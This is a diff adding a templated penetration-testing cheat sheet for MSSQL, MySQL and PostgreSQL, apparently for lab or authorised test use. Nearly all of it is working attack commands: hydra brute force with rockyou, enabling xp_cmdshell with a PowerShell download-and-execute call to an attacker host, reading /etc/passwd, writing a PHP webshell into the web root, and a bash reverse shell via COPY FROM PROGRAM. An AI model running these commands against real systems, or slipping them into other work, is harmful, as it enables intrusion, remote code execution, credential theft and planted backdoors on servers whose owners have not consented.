@@ -1,0 +1,61 @@
+# === MSSQL (1433) ===
+# Nmap
+nmap -sV --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p 1433 {{TARGET}}
+# Login
+sqsh -S {{TARGET}} -U {{USER}} -P {{PASS}}
+sqsh -S {{TARGET}} -U {{DOMAIN}}\\{{USER}} -P {{PASS}} -D master
+impacket-mssqlclient {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}} -windows-auth
+# Enable xp_cmdshell (RCE)
+EXEC SP_CONFIGURE 'show advanced options', 1; RECONFIGURE;
+EXEC SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell "IEX(New-Object Net.WebClient).DownloadString(''http://{{KALI}}:{{KALI_PORT}}/shell.ps1'')"';
+# Useful queries
+SELECT name FROM master.dbo.sysdatabases;
+SELECT * FROM information_schema.tables;
+SELECT user_name();
+# CrackMapExec
+crackmapexec mssql {{TARGET}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} -x "whoami"
+# Brute force
+hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt {{TARGET}} mssql
+
+# === MYSQL (3306) ===
+# Nmap
+nmap -sV -p 3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-users {{TARGET}}
+# Login
+mysql -h {{TARGET}} -u {{USER}} -p
+mysql -h {{TARGET}} -u root -p
+mysql -h {{TARGET}} -u root --skip-ssl
+# Useful queries
+SHOW DATABASES;
+USE {{DATABASE}};
+SHOW TABLES;
+SELECT user,password,host FROM mysql.user;
+SELECT * FROM {{TABLE}};
+# Read local files (if FILE privilege)
+SELECT LOAD_FILE('/etc/passwd');
+# Write webshell (if writable web dir and FILE privilege)
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+# Brute force
+hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt -s 3306 {{TARGET}} mysql
+
+# === POSTGRESQL (5432/5433) ===
+# Nmap
+nmap -sV -p 5432,5433 --script pgsql-brute {{TARGET}}
+# Login
+psql -h {{TARGET}} -p 5432 -U {{USER}} -W
+# Useful commands
+\l
+\c {{DATABASE}}
+\dt
+SELECT * FROM {{TABLE}};
+SELECT current_user;
+# RCE via COPY FROM PROGRAM (requires superuser)
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1';
+DROP TABLE IF EXISTS cmd_exec;
+# Brute force
+hydra -L users.txt -P passwords.txt -s 5432 {{TARGET}} postgresql
